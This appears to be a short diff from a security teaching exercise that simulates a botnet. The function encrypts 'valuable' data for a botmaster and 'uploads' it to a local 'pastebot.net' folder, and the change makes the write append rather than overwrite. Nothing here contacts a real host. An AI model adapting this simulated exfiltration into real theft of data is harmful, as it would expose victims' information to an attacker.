@@ -31,7 +31,7 @@ def upload_valuables_to_pastebot(fn):
     encrypted_master = encrypt_for_master(valuable_data)
 
     # "Upload" it to pastebot (i.e. save in pastebot folder)
-    f = open(os.path.join("pastebot.net", fn), "wb")
+    f = open(os.path.join("pastebot.net", fn), "ab")
     f.write(encrypted_master)
     f.close()
 
